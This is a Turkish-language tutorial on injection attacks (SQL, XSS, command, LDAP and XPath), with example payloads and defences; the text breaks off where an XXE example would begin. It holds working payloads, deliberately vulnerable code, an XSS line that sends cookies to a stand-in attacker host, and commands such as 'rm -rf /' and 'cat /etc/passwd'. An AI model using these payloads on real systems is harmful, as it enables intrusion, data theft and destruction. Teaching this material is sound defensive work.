# TEMEL ZAAFİYET TÜRLERİ

## INJECTION SALDIRILARI

Injection saldırıları, bir uygulamanın veri işleme mekanizmalarına kötü niyetli komutlar veya veri enjekte edilerek yapılan saldırılardır. Bu saldırılar, uygulamaların veya sistemlerin yanlış şekilde işlenmesini, veri hırsızlığını veya yetkisiz erişimi amaçlar. İşte injection saldırıları hakkında detaylı bilgiler:

### 1. SQL Injection

**SQL Injection**, bir web uygulamasının veri tabanıyla etkileşimde bulunan SQL sorgularına kötü niyetli kodların enjekte edilmesiyle gerçekleşir. Saldırganlar, bu yöntemle veri tabanına erişebilir, verileri değiştirebilir veya silebilir.

#### Örnek:
Kullanıcı giriş formuna şu şekilde bir veri girildiğinde:

```
' OR '1'='1
```

Bu veri, SQL sorgusunu manipüle ederek tüm kullanıcı hesaplarına erişim sağlayabilir.

#### Korunma Yöntemleri:
- Hazır SQL ifadeleri (Prepared Statements) kullanmak.
- Parametreli sorgular kullanmak.
- Kullanıcı girdilerini doğrulamak ve temizlemek.
- Güçlü erişim kontrolleri uygulamak.

### 2. Cross-site Scripting (XSS)

**XSS (Çapraz Site Betikleme)** saldırıları, kullanıcıların tarayıcılarında kötü niyetli JavaScript kodlarının çalıştırılmasını hedefler. Bu tür saldırılar, kullanıcıların oturum çerezlerini çalabilir veya kullanıcıya ait diğer hassas bilgilere erişim sağlayabilir.

#### Örnek:
Bir web sayfasına şu şekilde bir script etiketi eklemek:

```html
<script>alert('Bu bir XSS saldırısıdır!');</script>
```

#### Korunma Yöntemleri:
- Kullanıcı girdilerini doğru şekilde doğrulamak ve temizlemek.
- HTML, JavaScript ve diğer içeriklerin çıktısını uygun bir şekilde kodlamak.
- Content Security Policy (CSP) uygulamak.

### 3. Command Injection

**Command Injection**, bir uygulamanın işletim sistemi komutlarını çalıştırmasına neden olan saldırılardır. Saldırganlar, uygulamanın sunucuda çalıştırdığı komutları manipüle edebilir.

#### Örnek:
Bir form alanına şu şekilde bir komut girilmesi:

```
; rm -rf /
```

Bu komut, sunucudaki dosyaların silinmesine yol açabilir.

#### Korunma Yöntemleri:
- Kullanıcı girdilerini kısıtlamak ve temizlemek.
- Güvenli API ve fonksiyonlar kullanmak.
- Sunucuya erişim izinlerini minimumda tutmak.

### 4. LDAP Injection

**LDAP Injection**, LDAP sorgularının manipüle edilmesiyle gerçekleşir. Bu tür saldırılar, saldırganların dizin servislerine erişim sağlamasına olanak tanır.

#### Korunma Yöntemleri:
- Parametreli LDAP sorguları kullanmak.
- Kullanıcı girdilerini doğrulamak ve temizlemek.

### 5. XML Injection

**XML Injection**, XML verilerinin manipüle edilmesiyle ortaya çıkar. Saldırganlar, XML yapısını bozarak uygulama mantığını değiştirebilir.

#### Korunma Yöntemleri:
- XML verilerini doğru şekilde doğrulamak ve temizlemek.
- DTD ve dış varlık referanslarını kısıtlamak.

### Genel Korunma Yöntemleri

- **Güvenli Kodlama:** Yazılım geliştirme sürecinde güvenli kodlama standartları benimsenmelidir.
- **Güvenlik Testleri:** Uygulamalar, düzenli olarak güvenlik testlerinden geçirilmelidir.
- **Eğitim:** Geliştiricilere ve IT personeline güvenlik konusunda eğitim verilmelidir.
- **Güncellemeler:** Sistem ve yazılımlar güncel tutulmalıdır.

### Detaylar:

Tabii ki! SQL Injection (SQL enjeksiyonu), web uygulamalarındaki en yaygın ve tehlikeli güvenlik açıklarından biridir. Bu saldırı türü, kötü niyetli kişilerin veri tabanına yetkisiz erişim sağlamasına ve veri üzerinde zararlı işlemler yapmasına olanak tanır. İşte SQL Injection hakkında ayrıntılı bilgi ve örnekler:

### **SQL Injection Nedir?**

**SQL Injection**, bir uygulamanın veri tabanıyla etkileşim kurmak için kullandığı SQL sorgularına, kullanıcı girdisi aracılığıyla zararlı komutlar ekleyerek gerçekleştirilen bir saldırı tekniğidir. Bu saldırılar, veri tabanından gizli bilgilerin sızdırılması, veri değiştirme, silme veya hatta veri tabanını tamamen ele geçirme gibi sonuçlar doğurabilir.

### SQL Injection Çeşitleri

#### 1. **Klasik SQL Injection**

Kullanıcı girişlerinden veya form alanlarından gelen girdilerin SQL sorgularına doğrudan dahil edilmesi sonucunda meydana gelir.

##### Örnek:

```sql
SELECT * FROM users WHERE username = 'admin' AND password = '';
```

Eğer kullanıcı, `username` alanına `' OR '1'='1` girdisini girerse, sorgu şu şekilde olur:

```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '';
```

Bu sorgu, tüm kullanıcıları döndüren geçerli bir sorgu haline gelir.

#### 2. **Blind SQL Injection (Kör SQL Enjeksiyonu)**

Bu tür SQL enjeksiyonu, hata mesajları gibi doğrudan bilgi sağlamayan sistemlerde yapılır. Saldırganlar, yanıt süreleri veya farklı hata sayfaları gibi dolaylı ipuçlarıyla sorgunun etkili olup olmadığını belirler.

##### Örnek:

```sql
SELECT * FROM users WHERE username = 'admin' AND IF(1=1, sleep(10), false);
```

Eğer yanıt gecikiyorsa, saldırgan sistemin enjeksiyon ile uyumlu olduğunu anlar.

#### 3. **Error-based SQL Injection (Hata Temelli SQL Enjeksiyonu)**

Veritabanının hata mesajlarını döndürmesi sonucunda, saldırganın sistem hakkında bilgi toplamasına olanak tanır.

##### Örnek:

```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'a' OR 1=CONVERT(int, (SELECT @@version));
```

Bu örnek, SQL sunucusunun sürüm bilgilerini hata mesajı üzerinden elde etmeye çalışır.

#### 4. **Union-based SQL Injection (Birleşim Temelli SQL Enjeksiyonu)**

Union-based SQL Injection, saldırganın birden fazla SQL sorgusunu birleştirerek veri tabanından bilgi çekmesine olanak tanır.

##### Örnek:

```sql
SELECT name, email FROM users WHERE id = '1' UNION SELECT name, password FROM admin;
```

Bu sorgu, `users` tablosundaki kullanıcı bilgileri ile birlikte `admin` tablosundaki şifreleri de döndürebilir.

### SQL Injection Örnekleri

#### Örnek 1: Giriş Formu

Bir web sitesindeki giriş formunun SQL sorgusu şu şekilde olabilir:

```sql
SELECT * FROM users WHERE username = '$username' AND password = '$password';
```

Eğer kullanıcı adını şu şekilde girerse:

```
admin' -- 
```

SQL sorgusu şu hale gelir:

```sql
SELECT * FROM users WHERE username = 'admin' -- ' AND password = '';
```

`--` SQL’de bir yorum başlatıcısıdır ve sonrasında gelen kısmı geçersiz kılar. Bu nedenle, `admin` kullanıcısı için herhangi bir parola doğrulaması yapılmaz.

#### Örnek 2: Veri Tablosunu Listeleme

Bir saldırgan, belirli bir tabloyu veya veri tabanındaki sütunları listelemek isteyebilir. Örneğin, `products` tablosunda tüm verileri listelemek:

```sql
SELECT name, description FROM products WHERE id = 1 UNION SELECT table_name, column_name FROM information_schema.columns;
```

Bu sorgu, `products` tablosundaki `name` ve `description` ile birlikte bilgi şemasından tablo ve sütun isimlerini de döndürür.

#### Örnek 3: Blind SQL Injection

Saldırgan, bir veritabanının kullanıcı adını bulmak isteyebilir. Kör SQL enjeksiyonu kullanarak, şu şekilde bir sorgu yapılabilir:

```sql
SELECT * FROM users WHERE username = 'admin' AND ASCII(SUBSTRING((SELECT user()),1,1)) = 97;
```

Bu sorgu, kullanıcı adı `admin` olan bir hesabın ilk karakterinin ASCII kodunu kontrol eder. Eğer `97` (ki bu 'a' harfidir) ile eşleşirse, uygulama istenen yanıtı verir.

### SQL Injection Korunma Yöntemleri

1. **Parametreli Sorgular (Prepared Statements):**
   - SQL sorgularında kullanıcı girdilerinin doğrudan kullanılmasından kaçınılmalıdır. Bunun yerine, parametreli sorgular kullanılmalıdır.
   
   ```python
   cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))
   ```

2. **ORM Kullanımı:**
   - ORM (Object-Relational Mapping) araçları, SQL sorgularının otomatik olarak güvenli bir şekilde oluşturulmasına yardımcı olabilir.

3. **Girdi Doğrulama ve Temizleme:**
   - Kullanıcı girdilerini yalnızca beklenen formatta ve karakter kümesinde kabul etmek önemlidir. Örneğin, bir e-posta adresi yalnızca belirli bir desene göre kabul edilmelidir.

4. **En Az Yetki İlkesi:**
   - Veri tabanı kullanıcılarına yalnızca gerekli izinler verilmelidir. Uygulama, veri tabanı üzerinde yönetici yetkisi gerektirmemelidir.

5. **Güncellemeler ve Yamalar:**
   - Veri tabanı yönetim sistemleri ve uygulamalar, güvenlik güncellemeleri ve yamalarıyla düzenli olarak güncellenmelidir.

6. **Web Uygulama Güvenlik Duvarları (WAF):**
   - WAF'lar, SQL Injection ve diğer web tabanlı saldırılara karşı koruma sağlayabilir.

7. **Hata Mesajlarının Yönetimi:**
   - Veri tabanından kaynaklanan hata mesajları kullanıcıya gösterilmemelidir. Bunun yerine, kullanıcı dostu genel hata mesajları kullanılmalıdır.


----------------------------------------------------------------------


 Cross-site Scripting (XSS), bir web uygulamasına zararlı kodların enjekte edilmesiyle gerçekleştirilen bir saldırı türüdür. XSS saldırıları, bir kullanıcının tarayıcısında kötü amaçlı komutların çalışmasına neden olarak kullanıcı verilerini çalmayı, oturum çerezlerini ele geçirmeyi veya kullanıcının adına işlem yapmayı hedefler. İşte XSS hakkında ayrıntılı bilgi ve örnekler:

### **Cross-site Scripting (XSS) Nedir?**

**XSS saldırıları**, bir web uygulamasının kullanıcıya gönderdiği içerik içinde kötü amaçlı kodların çalıştırılmasıdır. Bu saldırılar, genellikle JavaScript, HTML veya diğer istemci tarafı kodlarının enjekte edilmesiyle gerçekleşir.

### XSS Çeşitleri

XSS saldırıları genellikle üç ana kategoriye ayrılır:

#### 1. **Stored XSS (Kalıcı XSS)**

Stored XSS, saldırganın zararlı kodları bir veri tabanına veya kalıcı bir depolama alanına kaydetmesiyle ortaya çıkar. Bu kod, başka bir kullanıcı bu içeriği görüntülediğinde çalıştırılır.

##### Örnek:

Bir kullanıcı forumunda veya yorum bölümünde zararlı bir script ekleyebilir:

```html
<script>alert('Bu bir Stored XSS saldırısıdır!');</script>
```

Bu kod, forumu veya yorumu ziyaret eden herkes için çalışacaktır.

#### 2. **Reflected XSS (Yansıtılmış XSS)**

Reflected XSS, saldırganın zararlı kodu doğrudan bir URL veya başka bir kullanıcı girişi yoluyla iletmesiyle ortaya çıkar. Bu tür saldırılar genellikle phishing (oltalama) amaçlı kullanılır.

##### Örnek:

Bir web sitesine şu şekilde bir URL ile saldırı yapılabilir:

```
http://example.com/search?q=<script>alert('Bu bir Reflected XSS saldırısıdır!');</script>
```

Eğer web sitesi, kullanıcıdan gelen `q` parametresini doğrulamadan yanıtına eklerse, bu kod çalıştırılır.

#### 3. **DOM-based XSS**

DOM-based XSS, istemci tarafında çalıştırılan JavaScript kodlarının, tarayıcıda Document Object Model (DOM) üzerinde manipülasyon yapmasıyla gerçekleşir. Bu tür saldırılar, tarayıcı tarafından işlenen girdilere dayanır ve genellikle tarayıcıda çalışır.

##### Örnek:

Bir web sitesi, URL'den bir parametre alarak sayfa içeriğini değiştiren bir JavaScript kodu kullanıyorsa:

```javascript
document.location.hash = "#name=<script>alert('Bu bir DOM-based XSS saldırısıdır!');</script>";
```

Bu durumda, URL'de belirlenen kod çalıştırılabilir.

### XSS Örnekleri

#### Örnek 1: Yorum Bölümü

Bir blog sitesindeki yorum bölümü, kullanıcıların yorumlarını görüntülerken girdileri doğru şekilde temizlemezse:

```html
<form method="POST">
  <input type="text" name="comment" />
  <input type="submit" value="Yorum Yap" />
</form>
```

Eğer kullanıcı şu şekilde bir yorum yaparsa:

```html
<script>document.location='http://hacker-site.com/steal?cookie='+document.cookie</script>
```

Bu kod, siteye giren diğer kullanıcıların çerez bilgilerini çalabilir.

#### Örnek 2: Arama Fonksiyonu

Bir web sitesinin arama fonksiyonu, kullanıcının arama sorgusunu direkt olarak sayfa içeriğine ekliyorsa:

```html
<html>
  <body>
    <h1>Arama Sonuçları:</h1>
    <p>Aradığınız kelime: <b><script>var userInput = window.location.search.substring(1); document.write(userInput);</script></b></p>
  </body>
</html>
```

Saldırgan, URL'yi şu şekilde manipüle edebilir:

```
http://example.com/search?<script>alert('XSS')</script>
```

Bu URL'yi tıklayan herkes, tarayıcısında bir uyarı penceresi görecektir.

#### Örnek 3: Kullanıcı Profili

Bir sosyal medya sitesinde kullanıcı profili oluşturulurken biyografi kısmına zararlı bir script eklenebilir:

```html
<div>
  Kullanıcı Biyografisi: <span id="bio"><script>alert('Profil XSS!');</script></span>
</div>
```

Bu kod, profili ziyaret eden herkese bir uyarı penceresi gösterebilir veya zararlı işlemler yapabilir.

### XSS Saldırılarına Karşı Korunma Yöntemleri

1. **Girdi Doğrulama ve Temizleme:**
   - Kullanıcı girdilerini yalnızca beklenen formatta ve karakter kümesinde kabul etmek önemlidir. Örneğin, özel karakterleri uygun şekilde kaçış karakterleriyle değiştirin.

2. **Çıktı Kodlama:**
   - HTML, JavaScript, CSS ve URL parametreleri için doğru kodlama tekniklerini kullanarak çıktıyı işleyin.

3. **Content Security Policy (CSP):**
   - CSP, belirli kaynaklardan gelen içeriği kısıtlayarak XSS saldırılarını önlemeye yardımcı olabilir.

   ```html
   <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' https://trusted-cdn.com;">
   ```

4. **HTTPOnly ve Secure Bayrakları:**
   - Çerezleri `HttpOnly` ve `Secure` bayraklarıyla işaretleyin, böylece JavaScript tarafından erişilemez ve yalnızca güvenli bağlantılarda iletilirler.

5. **JavaScript Kütüphanelerini Güncel Tutmak:**
   - Uygulamalarda kullanılan tüm JavaScript kütüphanelerinin ve eklentilerin güncel olduğundan emin olun.

6. **Güvenli Kodlama Uygulamaları:**
   - Yazılım geliştirme sürecinde güvenli kodlama standartları benimsenmelidir. OWASP (Open Web Application Security Project) gibi güvenlik kaynaklarını takip edin.

------------------------------------------------------------------------------------

**Command Injection** (Komut Enjeksiyonu), bir saldırganın, bir uygulamanın sunucuda çalıştırdığı komutları manipüle ederek yetkisiz işletim sistemi komutları çalıştırmasına olanak tanıyan bir güvenlik açığıdır. Bu saldırı türü, özellikle kullanıcı girdilerinin doğrudan işletim sistemi komutları içinde kullanıldığı durumlarda meydana gelir. İşte Command Injection hakkında ayrıntılı bilgi ve örnekler:

---

## **Command Injection Nedir?**

**Command Injection**, bir uygulamanın işletim sistemi düzeyinde çalıştırdığı komutları hedef alır. Saldırgan, uygulama üzerinden sunucu komutlarını çalıştırarak sistem üzerinde yetkisiz erişim kazanabilir, dosyaları değiştirebilir, silebilir veya hassas verilere ulaşabilir.

Command Injection, özellikle web uygulamalarının veya yazılımların kullanıcı girdilerini işletim sistemi komutları içine doğrudan yerleştirdiği durumlarda ortaya çıkar. Bu tür saldırılar, bir işletim sistemi komutunu, kullanıcı tarafından sağlanan verilere göre oluşturan uygulamalarda gerçekleşir.

### Komut Enjeksiyonunun Özellikleri

- **İşletim Sistemi Seviyesinde Tehlike:** İşletim sistemi düzeyinde yetkisiz komut çalıştırma yeteneği sağlar.
- **Platforma Bağlılık:** Windows, Linux, macOS gibi farklı işletim sistemlerinde farklı komutlar kullanılarak gerçekleştirilebilir.
- **Doğrudan Etki:** Verilerin çalınması, dosyaların değiştirilmesi/silinmesi, sistem kontrolünün ele geçirilmesi gibi doğrudan zararlı etkiler oluşturabilir.

### Common Vulnerabilities and Exposures (CVE)

Command Injection, CVE listesinde sıklıkla belirtilen bir güvenlik açığıdır. Örneğin:

- **CVE-2021-22986:** F5 BIG-IP ve BIG-IQ ürünlerinde bir Command Injection açığı tespit edilmiştir. Bu açık, saldırganların yetkisiz sistem komutları çalıştırmasına olanak tanır.
- **CVE-2018-12613:** phpMyAdmin yazılımında tespit edilen bir Command Injection açığı, saldırganların sistem komutlarını çalıştırmasına izin vermektedir.

---

## Command Injection Çeşitleri

Command Injection genellikle iki ana şekilde karşımıza çıkar:

### 1. **Basit Komut Enjeksiyonu**

Kullanıcı girdi alanlarına doğrudan işletim sistemi komutları eklenerek yapılan saldırılardır.

#### Örnek:

Bir web uygulaması, kullanıcının belirttiği bir dosyayı listelemek için `ls` komutunu kullanabilir:

```python
import os

def list_files(directory):
    command = f"ls {directory}"
    os.system(command)

list_files("/var/www/uploads/")
```

Bu işlev, kullanıcıdan gelen dizin adını doğrudan komut satırına ekler. Saldırgan, dizin adını aşağıdaki gibi manipüle edebilir:

```plaintext
"; rm -rf /"
```

Bu girdi, komutu şu şekilde değiştirir:

```plaintext
ls /var/www/uploads/; rm -rf /
```

Sonuç olarak, bu enjeksiyon sistemi etkileyen zararlı bir işlemi tetikleyebilir.

### 2. **Zincirleme Komut Enjeksiyonu**

Birden fazla komutun zincirleme olarak çalıştırılmasıyla yapılan saldırılardır. Saldırgan, birden fazla komutu arka arkaya çalıştırarak daha karmaşık işlemler gerçekleştirebilir.

#### Örnek:

Bir web uygulaması, kullanıcıdan alınan IP adresine ping atarak bağlantı kontrolü yapabilir:

```python
import os

def ping(ip_address):
    command = f"ping -c 4 {ip_address}"
    os.system(command)

ping("192.168.1.1")
```

Saldırgan, IP adresi yerine şu türde bir girdi sağlayarak komut zinciri oluşturabilir:

```plaintext
192.168.1.1; cat /etc/passwd
```

Bu, komutu şu şekilde değiştirir:

```plaintext
ping -c 4 192.168.1.1; cat /etc/passwd
```

Bu tür enjeksiyonlar, saldırganın sunucunun hassas bilgilerini elde etmesine neden olabilir.

---

## Command Injection Örnekleri

### Örnek 1: PHP ile Dosya İndirme

Bir web uygulaması, kullanıcıdan alınan bir dosya adını alarak dosyanın içeriğini gösteriyor olabilir:

```php
<?php
$file = $_GET['file'];
system("cat " . $file);
?>
```

Bu kodda, `file` parametresi doğrudan `cat` komutuna eklenmiştir. Eğer saldırgan şu şekilde bir URL kullanırsa:

```
http://example.com/showfile.php?file=/etc/passwd;ls
```

Bu, şu komutu çalıştırır:

```plaintext
cat /etc/passwd;ls
```

Sonuç olarak, saldırgan `passwd` dosyasının içeriğini görebilir ve mevcut dizindeki dosyaların listesini alabilir.

### Örnek 2: Python ile Komut Çalıştırma

Bir Python uygulaması, kullanıcıdan alınan bir alan adını ping atarak kontrol edebilir:

```python
import os

domain = input("Domain adı girin: ")
os.system(f"ping -c 4 {domain}")
```

Saldırgan, şu türde bir girdi sağlayarak işletim sistemine komut enjeksiyonu yapabilir:

```
example.com; ls -la
```

Bu girdi, komutu şu şekilde değiştirir:

```plaintext
ping -c 4 example.com; ls -la
```

Bu, saldırganın dizindeki dosyaları görmesine izin verir.

### Örnek 3: Shell Komutları ile Zarar Verme

Bir komut satırı uygulaması, kullanıcıdan dosya adı alarak dosya içeriğini ekrana yazabilir:

```bash
echo "Dosya adını girin:"
read filename
cat $filename
```

Kullanıcı, şu türde bir giriş yapabilir:

```plaintext
/etc/passwd; rm -rf /
```

Bu, komutu şu şekilde değiştirir:

```bash
cat /etc/passwd; rm -rf /
```

Sonuç olarak, bu komut sistemde büyük zararlara yol açabilir.

---

## Command Injection Korunma Yöntemleri

Command Injection saldırılarından korunmak için alınabilecek çeşitli önlemler bulunmaktadır:

### 1. **Girdi Doğrulama ve Temizleme**

- **Whitelist Kullanımı:** Kullanıcı girdilerini yalnızca belirli bir izin verilen karakter listesine göre kabul edin. Girdileri kontrol ederek özel karakterlerin kullanımını kısıtlayın.
- **Escape Kullanımı:** Komut satırına eklenen kullanıcı girdilerini uygun şekilde escape karakterleriyle işleyin.

### 2. **Parametreli Komutlar**

- **Parametreli Sistem Çağrıları Kullanımı:** `subprocess` gibi modüller kullanarak parametreli komut çağrıları yapın. Örneğin, Python'da `subprocess.run()` fonksiyonu kullanabilirsiniz:

  ```python
  import subprocess

  subprocess.run(["ping", "-c", "4", domain])
  ```

### 3. **Güvenli API ve Kütüphaneler Kullanımı**

- **Güvenli Kütüphaneler:** İşletim sistemi seviyesinde komut çalıştırmayı gerektiren işlemler için güvenli kütüphaneler kullanarak doğrudan komut çalıştırmaktan kaçının.

### 4. **Kullanıcı Yetkileri**

- **En Az Yetki İlkesi:** Uygulama ve veri tabanı kullanıcılarına yalnızca gerekli izinler verilmeli. Özellikle yönetici yetkisi gerektiren işlemlerde dikkatli olunmalı.

### 5. **Çıkış Mesajları ve Hataların Gizlenmesi**

- **Hata Mesajlarının Yönetimi:** Uygulama hata mesajlarını ve çıktıları kullanıcıdan gizleyerek saldırganların sistem hakkında bilgi toplamasını engelleyin.

### 6. **Güvenlik Duvarları ve İzleme**

- **WAF Kullanımı:** Web Uygulama Güvenlik Duvarları (WAF), uygulamaya yönelik Command Injection saldırılarını engelleyebilir.
- **Güvenlik İzleme:** Sunucu ve uygulama güvenlik loglarını düzenli olarak inceleyin.

---

-------------------------------------------------------------------------------------------


LDAP Injection, uygulamalarda LDAP (Lightweight Directory Access Protocol) ile ilgili sorguların kullanıcı tarafından manipüle edilmesiyle gerçekleştirilen bir güvenlik açığıdır. Bu saldırı türü, saldırganların dizin bilgilerini değiştirmesine, hassas verilere erişmesine veya yetkisiz işlemler yapmasına olanak tanır. İşte LDAP Injection hakkında ayrıntılı bilgi ve örnekler:

---

## **LDAP Injection Nedir?**

**LDAP Injection**, bir uygulamanın LDAP dizin sunucusuna gönderdiği sorguların kullanıcı girdileri aracılığıyla değiştirilmesiyle ortaya çıkan bir saldırı türüdür. Bu saldırılar, SQL Injection'a benzer şekilde, uygulamanın kullanıcı girdilerini uygun şekilde temizlemeden veya doğrulamadan LDAP sorgularına eklemesi durumunda gerçekleşir.

### LDAP Nedir?

LDAP (Lightweight Directory Access Protocol), dizin hizmetlerine erişim sağlamak için kullanılan bir protokoldür. Dizin hizmetleri, kullanıcı bilgileri, grup bilgileri, ağ kaynakları gibi çeşitli bilgilerin saklandığı ve yönetildiği bir yapıdır. Örneğin, Microsoft Active Directory, LDAP protokolünü kullanarak kullanıcı ve kaynak bilgilerini yönetir.

### LDAP Injection Nasıl Çalışır?

LDAP Injection, saldırganın kullanıcı giriş alanları veya HTTP istekleri gibi girdiler üzerinden LDAP sorgularını manipüle ederek yetkisiz işlemler gerçekleştirmesine olanak tanır. Saldırgan, sorguya ek veriler ekleyerek veya mevcut sorguyu değiştirmek suretiyle dizin üzerinde kontrol elde etmeye çalışır.

---

## LDAP Injection Çeşitleri

LDAP Injection genellikle iki ana biçimde karşımıza çıkar:

### 1. **Blind LDAP Injection (Kör LDAP Enjeksiyonu)**

Bu tür enjeksiyonlar, sistemin saldırı sonuçlarını doğrudan geri döndürmediği durumlarda gerçekleştirilir. Saldırgan, yanıt süreleri veya diğer dolaylı ipuçları kullanarak sistemdeki bilgileri elde etmeye çalışır.

#### Örnek:

Bir uygulama, kullanıcıdan alınan bilgileri LDAP dizinine sorgulamak için kullanıyor olabilir:

```python
ldap_search_filter = f"(uid={user_input})"
```

Saldırgan, giriş alanına aşağıdaki gibi bir girdi sağlayabilir:

```
*)(|(uid=*))
```

Bu girdi, LDAP filtresini şu şekilde manipüle eder:

```
(&(uid=*)(|(uid=*)))
```

Bu durumda, saldırgan dizindeki tüm kullanıcıları veya belirli bir kullanıcıyı sorgulama yetkisi elde edebilir.

### 2. **Authenticated LDAP Injection (Kimlik Doğrulamalı LDAP Enjeksiyonu)**

Kimlik doğrulama süreçlerini atlatmak veya yetkisiz erişim elde etmek amacıyla LDAP sorgularını manipüle etmeye yönelik saldırılardır.

#### Örnek:

Bir uygulama, kullanıcı giriş bilgilerini doğrulamak için LDAP kullanıyor olabilir:

```python
ldap_search_filter = f"(&(uid={username})(password={password}))"
```

Saldırgan, `username` veya `password` alanına şu şekilde bir girdi sağlayabilir:

```
admin)(|(password=*))
```

Bu, LDAP filtresini şu şekilde değiştirir:

```
(&(uid=admin)(|(password=*)))
```

Bu tür bir manipülasyon, saldırganın herhangi bir parola ile giriş yapmasına olanak tanıyabilir.

---

## LDAP Injection Örnekleri

### Örnek 1: Basit LDAP Sorgusu

Bir uygulama, kullanıcıdan alınan bir kullanıcı adı ile LDAP sorgusu yapıyor olabilir:

```java
String userInput = request.getParameter("username");
String ldapSearchQuery = "(&(objectClass=user)(uid=" + userInput + "))";
```

Saldırgan, `username` alanına aşağıdaki gibi bir giriş yaparak sorguyu manipüle edebilir:

```
*)(|(uid=*))
```

Bu giriş, LDAP sorgusunu şu şekilde değiştirir:

```
(&(objectClass=user)(uid=*)(|(uid=*)))
```

Bu sorgu, dizindeki tüm kullanıcıları döndürebilir.

### Örnek 2: Gelişmiş LDAP Sorgusu

Bir uygulama, LDAP kullanarak kullanıcıya ait bilgileri getiriyor olabilir:

```php
$filter = "(&(objectClass=person)(cn=" . $input . "))";
$search = ldap_search($ds, "dc=example,dc=com", $filter);
```

Saldırgan, `cn` alanına şu şekilde bir giriş yapabilir:

```
John Doe)(|(memberOf=cn=admins,dc=example,dc=com))
```

Bu, LDAP filtresini şu şekilde değiştirir:

```
(&(objectClass=person)(cn=John Doe)(|(memberOf=cn=admins,dc=example,dc=com)))
```

Bu, saldırganın sadece belirli bir kullanıcıyı değil, aynı zamanda admin grubunun bir üyesini de hedeflemesine olanak tanır.

### Örnek 3: Kimlik Doğrulama Atlatma

Bir giriş sistemi, kullanıcıdan alınan bilgileri LDAP sorgusuyla doğruluyor olabilir:

```python
import ldap

ldap_connection = ldap.initialize('ldap://example.com')
ldap_connection.simple_bind_s(f"uid={username},ou=users,dc=example,dc=com", password)
```

Saldırgan, `username` alanına şu şekilde bir girdi sağlayabilir:

```
admin)(|(uid=*))
```

Bu, LDAP sorgusunu şu şekilde manipüle eder:

```
(&(uid=admin)(|(uid=*)))
```

Bu saldırı, saldırganın herhangi bir parola ile admin kullanıcısı olarak giriş yapmasına olanak tanır.

---

## LDAP Injection Korunma Yöntemleri

LDAP Injection saldırılarına karşı korunmak için aşağıdaki yöntemler uygulanabilir:

### 1. **Girdi Doğrulama ve Temizleme**

- **Önceden Belirlenmiş Karakter Setleri:** Kullanıcı girdilerini kabul etmeden önce belirli bir karakter setine göre doğrulayın ve yalnızca izin verilen karakterlerin kullanılmasını sağlayın.
  
- **Escape Kullanımı:** Kullanıcı girdilerinde özel karakterleri escape karakterleriyle değiştirin. Örneğin, LDAP özel karakterlerini (`*`, `(`, `)`, `\`, vb.) uygun şekilde işleyin.

### 2. **Parametreli Sorgular Kullanımı**

- **Parametreli LDAP Sorguları:** Kullanıcı girdilerini doğrudan sorgulara eklemek yerine parametreli sorgular kullanarak güvenli bir şekilde işlemleri gerçekleştirin.

### 3. **Güvenli LDAP Kütüphaneleri Kullanımı**

- **Güvenli LDAP API'leri:** Güvenli LDAP kütüphaneleri ve API'leri kullanarak doğrudan sorguların oluşturulmasından kaçının.

### 4. **Yetki Kontrolü ve Kimlik Doğrulama**

- **Etkili Yetki Kontrolü:** Uygulamada etkili bir yetki kontrol mekanizması kurarak kullanıcıların yalnızca izin verilen işlemleri gerçekleştirmesini sağlayın.

### 5. **Hata Mesajlarının Gizlenmesi**

- **Hata Mesajlarını Sınırlama:** Uygulama tarafından üretilen hata mesajlarının kullanıcıya gösterilmesini sınırlandırarak saldırganların sistem hakkında bilgi toplamasını engelleyin.

### 6. **Düzenli Güvenlik Testleri**

- **Penetrasyon Testleri:** Düzenli olarak güvenlik testleri ve penetrasyon testleri gerçekleştirerek uygulamanın güvenliğini sürekli değerlendirin.

---

-------------------------------------------------------------------------------------------

**XML Injection**, bir uygulamanın XML verilerini işlerken kullanıcıdan gelen girdileri doğru bir şekilde doğrulamaması sonucunda ortaya çıkan bir güvenlik açığıdır. Bu saldırı türü, saldırganların XML verilerini manipüle etmesine, veritabanlarına veya diğer sistemlere yetkisiz erişim sağlamasına ve çeşitli zarar verici işlemler gerçekleştirmesine olanak tanır.

---

## **XML Injection Nedir?**

**XML Injection**, bir uygulamanın XML tabanlı bir veri akışına veya sorgusuna (örneğin, XPath sorguları) kullanıcı tarafından manipüle edilmiş veriler eklemesiyle ortaya çıkan bir güvenlik açığıdır. Saldırganlar, XML Injection kullanarak veri yapısını değiştirebilir, hassas verilere erişebilir, veri bütünlüğünü bozabilir ve uygulama davranışını değiştirebilir.

### XML Nedir?

XML (eXtensible Markup Language), veri saklama ve taşımada kullanılan yaygın bir biçimdir. Yapısal ve hiyerarşik bir veri modeli sunar ve çeşitli uygulamalar arasında veri alışverişi için kullanılır.

### XML Injection Nasıl Çalışır?

XML Injection, kullanıcıdan alınan girdilerin doğrudan XML belgelerine veya sorgularına dahil edilmesiyle gerçekleşir. Bu tür bir saldırı, XML verilerinin yapısını değiştirmeye, özel karakterlerin ve etiketlerin manipülasyonuna ve kötü amaçlı kodların çalıştırılmasına olanak tanır.

---

## XML Injection Çeşitleri

### 1. **XPath Injection**

XPath Injection, bir XML belgesini sorgulamak için kullanılan XPath ifadelerinin manipüle edilmesiyle gerçekleşir. Saldırgan, sorguya eklenen verileri değiştirerek yetkisiz veri erişimi sağlayabilir.

#### Örnek:

Bir uygulama, kullanıcıdan gelen bir kullanıcı adı ve parola ile XML tabanlı bir veritabanını sorguluyor olabilir:

```xml
<users>
    <user>
        <username>admin</username>
        <password>password123</password>
    </user>
    <user>
        <username>user1</username>
        <password>pass1234</password>
    </user>
</users>
```

PHP ile sorgulama:

```php
$username = $_POST['username'];
$password = $_POST['password'];
$query = "//user[username/text()='$username' and password/text()='$password']";
$results = $xpath->query($query);
```

Saldırgan, kullanıcı adı veya parola alanına şu şekilde bir girdi sağlayabilir:

```
' or '1'='1
```

Bu, sorguyu şu şekilde değiştirir:

```xml
//user[username/text()='' or '1'='1' and password/text()='' or '1'='1']
```

Bu durumda, XPath sorgusu her zaman true döner ve saldırganın yetkisiz erişim elde etmesine olanak tanır.

### 2. **XXE (XML External Entity) Attack**

XXE, XML Injection'ın bir alt türüdür ve XML belgelerinin dış kaynaklardan veri çekmesine olanak tanır. Bu saldırı, saldırganın sistemdeki dosyaları okumasına veya uzaktan kod çalıştırmasına neden olabilir.

#### Örnek:

Bir uygulama, XML belgelerini işlemekte ve dış varlıkları kabul etmekteyse:

```xml
